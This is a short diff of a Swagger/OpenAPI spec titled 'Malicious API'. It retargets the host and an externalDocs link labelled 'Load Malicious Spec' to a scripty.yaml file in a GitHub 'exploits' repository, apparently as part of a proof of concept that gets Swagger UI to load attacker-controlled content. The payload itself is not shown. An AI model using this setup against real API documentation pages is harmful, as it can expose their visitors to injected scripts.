@@ -4,12 +4,12 @@
     "title": "Malicious API",
     "version": "1.0"
   },
-  "host": "yourdomain.com",
+  "host": "github.com",
   "schemes": ["https"],
   "basePath": "/",
   "paths": {},
   "externalDocs": {
     "description": "Load Malicious Spec",
-    "url": "https://yourdomain.com/scripty.yaml"
+    "url": "https://github.com/eabubakr21/exploits/blob/main/scripty.yaml"
   }
 }
